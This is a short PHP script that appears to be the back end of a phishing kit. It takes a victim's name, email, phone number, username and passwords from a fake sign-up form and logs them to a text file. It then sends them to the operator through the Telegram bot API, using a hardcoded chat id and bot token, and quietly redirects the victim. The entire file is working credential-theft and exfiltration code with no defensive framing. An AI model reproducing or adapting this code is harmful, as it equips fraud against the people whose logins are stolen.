<?php 

extract($_REQUEST);
$file=fopen("Log1.txt","a");

fwrite($file,"############ \n");
fwrite($file, ">Firstname: ");
fwrite($file,$fname."\n");
fwrite($file, ">Email: ");
fwrite($file,$email ."\n");
fwrite($file,">Tele: ");
fwrite($file,$tele ."\n");
fwrite($file, ">Username: ");
fwrite($file,$username ."\n");
fwrite($file, ">Password1: ");
fwrite($file,$password1 ."\n");
fwrite($file, ">Password2: ");
fwrite($file,$password2 ."\n");

fwrite($file,"############ \n");

fwrite($file, "\n");
fclose($file);

$telegram="on";
$f=$_POST["fname"];
$e=$_POST["email"];
$t=$_POST["tele"];
$u=$_POST["username"];
$p1=$_POST["password1"];
$p2=$_POST["password2"];

$data=" ##### \n  $f \n $e \n $t \n $u \n $p1 \n $p2 \n";

$txt=$data;
$chat_id="5258142426"; // my chat id
$bot_url="6794346246:AAF_0zUfZd2aMHU7zK2I3_fCL7-ablTxNBo"; // bot api 

if ($telegram=="on") {
  $send=['chat_id'=> $chat_id, 'text'=>$txt];
  $website="https://api.telegram.org/{$bot_url}";
  $ch=curl_init($website.'/sendMessage');
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_POST,1);
  curl_setopt($ch,CURLOPT_POSTFIELDS,($send));
  curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
  $result = curl_exec($ch);
  curl_close($ch);
}


header("location:signu.html");

?>
